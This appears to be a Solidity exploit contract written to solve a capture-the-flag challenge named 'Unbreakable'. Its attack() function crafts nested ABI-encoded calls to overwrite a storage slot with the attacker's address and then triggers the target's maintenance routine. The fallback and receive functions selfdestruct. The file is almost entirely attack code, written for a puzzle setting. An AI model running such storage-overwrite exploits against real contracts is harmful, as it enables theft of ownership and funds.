pragma solidity ^0.8.11;

interface IUnbreakable {
    function brake(Solution calldata solution) external;
    function Error(string memory _error) external;
    function Panic(uint256 id) external view returns (bool);
    function owner() external view returns (address);
    function doStorageMaintenance() external;
}

struct Solution {
    // challenge 1
    uint ch1_slot;
    bytes32 ch1_value;

    // challenge 2
    uint ch2_amount;
    string ch2_error;

    // reward
    bytes reward;
}

contract Exploit {
    IUnbreakable unbreakable;

    constructor(IUnbreakable _unbreakable) {
        unbreakable = _unbreakable;
    }

    function attack() public payable {
        bytes memory panic_call = abi.encodeWithSignature("Panic(uint256)", 1);
        bytes memory challenge2_call = abi.encodeWithSignature("challenge2(uint,string)", 0, string(panic_call));
        bytes memory error_call = abi.encodeWithSignature("Error(string)", string(challenge2_call));

        Solution memory solution;
        solution.ch1_slot = 5;
        solution.ch1_value = bytes32(uint256(uint160(address(this))));
        solution.ch2_amount = 1;
        solution.ch2_error = string(challenge2_call);
        // solution.ch2_error = string(error_call);
        solution.reward = challenge2_call;


        unbreakable.brake(solution);
        unbreakable.doStorageMaintenance();
    }

    receive() external payable {
        selfdestruct(payable(address(0)));
    }

    fallback() external payable {
        selfdestruct(payable(address(0)));
    }
}